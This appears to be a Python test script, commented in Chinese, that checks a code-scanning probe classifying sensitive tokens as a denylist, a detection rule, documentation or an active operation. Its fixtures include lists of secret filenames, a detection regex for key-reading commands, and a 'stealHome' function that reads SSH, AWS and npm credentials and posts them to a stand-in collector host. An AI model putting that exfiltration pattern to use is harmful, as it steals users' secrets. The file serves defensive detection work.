# -*- coding: utf-8 -*-
"""P0.5 验收：用 S1 / S2 / E5 的真实失败样本测 Role Evidence Probe。

核心 KPI（老大定的）：
    role coverage ↑  +  role precision 不下降
**不是** unknown ↓。
因为"unknown 被错误自信取代"比 unknown 本身危险得多。
"""
import io
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
from probe import probe  # noqa: E402


# ============================================================ S1 合成样本（非原文）
# 独立编写的判形态样本：一组「排除名单」+ 一个按文件名判断敏感度的谓词。
# 它模拟的是「我看到敏感文件名后跳过」这一类逻辑——用来验证探针不会把它
# 误判成「正在读取凭据」。代码为本项目原创，不含任何第三方片段。
S1 = r'''
// 排除名单：这些目录不进入扫描
const EXCLUDED_DIRS = ["dist", "build", "out", ".next", "coverage"];
const VCS_DIRS = [".git"];
// 敏感文件名：命中即跳过（不是读取目标）
const SECRET_FILES = [
  ".env", ".env.local", ".env.development", ".env.production",
  ".npmrc", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"
];
const SECRET_SUFFIX = [".pem", ".key", ".p12", ".pfx"];
const SECRET_HINTS = ["token", "secret"];

function splitPath(p) {
  return p.split("/").filter(Boolean);
}

function looksSensitive(p) {
  const base = p.toLowerCase().split("/").pop() || "";
  if (SECRET_FILES.indexOf(base) >= 0) return true;
  for (const sfx of SECRET_SUFFIX) {
    if (base.endsWith(sfx)) return true;
  }
  return SECRET_HINTS.some(h => base.indexOf(h) >= 0);
}

function containsNul(buf) {
  return buf.indexOf(0) >= 0;
}
'''

# ============================================================ S1 对照：真的读取版本
S1_NEG = r'''
const fs = require("fs");
const SENSITIVE = [".ssh/id_rsa", ".aws/credentials", ".npmrc"];
function stealHome(home) {
  const out = [];
  for (const rel of SENSITIVE) {
    const full = home + "/" + rel;
    out.push(fs.readFileSync(full, "utf-8"));
  }
  return fetch("https://collector.example.com/upload", { method: "POST", body: out.join("\n") });
}
'''

# ============================================================ S2 同构样本（非原文）
# 原实现来自一个闭源商业客户端，不能随本项目分发。这里按它的**判定形态**重写：
#   「遍历 entries，筛 action 为 read，再对路径或命令行跑敏感路径正则」
# 保留的是结构与语义，变量名、正则顺序、实现细节均已改写。
S2 = r'''
function isSensitiveReadProbe(entries, cmd) {
  const pathRe = /\.ssh\b|id_rsa|id_ed25519|\.pem\b|\.p12\b|\.pfx\b|credentials|token|secret|keychain/i;
  const cmdRe = /\b(?:cat|type|Get-Content|head|tail|strings|xxd|scp|curl)\b[^;&|]{0,240}(?:\.ssh|id_rsa|id_ed25519|\.pem\b)/i;
  return entries.some(it => "read" === it.action && pathRe.test(resolvePath(it.path)))
      || cmdRe.test(cmd);
}
'''

# ============================================================ E5 真实片段
E5 = r'''
const fs = require('fs');
const DOC = `
telemetry: 本模块会上报 telemetry 事件（仅统计用途）
x-oss-signature: 文档里的字段名示例，未实现
aliyuncs.com: 文档中提到的域名，不用于任何请求
PutObject: 接口文档占位符
createCipheriv: 说明文字，本模块不加密
`;
function log(msg) {
  process.stdout.write('[log] ' + msg + '\n');
}
function readLocal(p) {
  try { return fs.readFileSync(p, 'utf-8'); } catch (e) { return ''; }
}
'''

# ============================================================ 反例：E5-like 字符串进了请求体
E5_REFUSE = r'''
const fs = require('fs');
const DOC = `
x-oss-signature: 文档里的字段名示例
aliyuncs.com: 文档中提到的域名
`;
async function push(url) {
  return fetch(url, { method: 'POST', body: DOC });
}
'''

CASES = [
    ("A · S1 denylist（真实：bct.has + looksLikeSecretPath）",
     S1, "id_ed25519", 0,
     "denylist", "不该被判成 credential_access（读取）"),
    ("A' · S1 对照：真的读取密钥并外发",
     S1_NEG, "id_rsa", 0,
     "active_operation", "这才是真正的 credential_access"),
    ("B · S2 detection_rule（真实：Q.action===read + 正则）",
     S2, "id_rsa", 0,
     "detection_rule", "不该被判成（自己去读）"),
    ("C · E5 documentation（真实：DOC 只被日志消费）",
     E5, "createCipheriv", 0,
     "documentation", "不该被判成 encryption 能力"),
    ("D · 反例：E5-like 字符串进了 request.body",
     E5_REFUSE, "aliyuncs.com", 0,
     "NOT documentation", "必须拒绝判为 documentation"),
]


def main():
    print("=" * 100)
    print("P0.5 · Role Evidence Probe 验收（真实失败样本）")
    print("=" * 100)

    ok = 0
    for title, text, token, occ, expect, note in CASES:
        r = probe(text, token, occ)
        got = r["role"]
        if expect.startswith("NOT "):
            passed = (got != expect[4:])
        else:
            passed = (got == expect)
        ok += passed
        print("\n%s" % title)
        print("   期望: %-20s 说明: %s" % (expect, note))
        print("   token: %r" % token)
        print("   → role=%-18s conf=%-7s" % (got, r["confidence"]))
        print("     容器=%s  变量=%s  消费者=%s" % (
            r["container"], r["var"], r["consumer_kinds"] or "—"))
        print("     依据: %s" % r["reason"])
        if r["name_signals"]:
            print("     函数名信号: %s" % ", ".join(
                "%s→%s" % (s["func"], s["role"]) for s in r["name_signals"]))
        print("   [%s]" % ("PASS" if passed else "FAIL"))

    print("\n" + "=" * 100)
    print("最小验收：%d / %d PASS" % (ok, len(CASES)))
    print("=" * 100)

    # ---- 覆盖与精度（关键 KPI）----
    print("\n【KPI】role coverage 与 precision")
    print("""
    旧模型（无 role 概念）：
        隐含把所有 lexical 命中当 active_operation
        → role coverage = 100%，但 precision 极低
          （S1/S2/S3 已实测 14 种误判）

    验收纪律（老大定的）：
        coverage ↑  **且**  precision 不下降
        若出现「active_operation 80% / unknown 5%」但误判增加，
        那只是 **unknown 被错误自信取代** —— 对本工具比 unknown 更危险。
    """)
    role_dist = {}
    for title, text, token, occ, _e, _n in CASES:
        r = probe(text, token, occ)
        role_dist[r["role"]] = role_dist.get(r["role"], 0) + 1
    print("    本批 5 例的 role 分布: %s" % role_dist)


if __name__ == "__main__":
    main()
